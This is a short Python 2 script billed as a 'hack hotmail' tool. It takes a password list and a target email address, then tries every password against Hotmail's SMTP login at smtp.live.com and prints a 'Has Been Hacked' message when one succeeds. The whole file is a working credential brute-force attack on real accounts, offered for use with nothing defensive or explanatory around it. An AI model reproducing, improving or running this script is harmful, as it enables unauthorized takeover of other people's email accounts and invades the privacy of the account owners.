#!/usr/bin/python
'''create by ali qassem (antqame) '''

import smtplib
from os import system

def main():
   print '================================================='
   print 'Author antqame'
   print'Name_script hack hotmail'
   print'website http://www.antqame.blogspot.com'
   print'facebook https://www.facebook.com/ANtqAmE'
   print''
   print '================================================='
   print '               ++++++++++++++++++++              '
   print '\n                                               '
   print '                                                 '
   print '                                                 '
   print '                                                 '
   print '                                                 '
   print '                                                 '
   print '                                                 '
   print '                                                 '
   print '                                                 '
   print '                                                 '
   print '                                                 '
   print '                                                 '
   print '                                                 '
   print '                                                 '
   print '                                                 '

main()
print '[1] start the attack'
print '[2] exit'
option = input('==>')
if option == 1:
   file_path = raw_input('path of passwords file :')
else:
   system('clear')
   exit()
pass_file = open(file_path,'r')
pass_list = pass_file.readlines()
def login():
    i = 0
    user_name = raw_input('target email :')
    server = smtplib.SMTP('smtp.live.com', 587)
    server.ehlo()
    server.starttls()
    for password in pass_list:
      i = i + 1
      print str(i) + '/' + str(len(pass_list))
      try:
         server.login(user_name, password)
         system('clear')
         print '\n'
         print '[+] This email Has Been Hacked Password ==> :' + password + '     ^_^'
         break
      except smtplib.SMTPAuthenticationError as e:
         error = str(e)
         if error[14] == '<':
            system('clear')
            print '[+] this email has been hacked, password ==> :' + password + '     ^_^'

            break
         else:
            print '[!] password not found => ' + password
login()
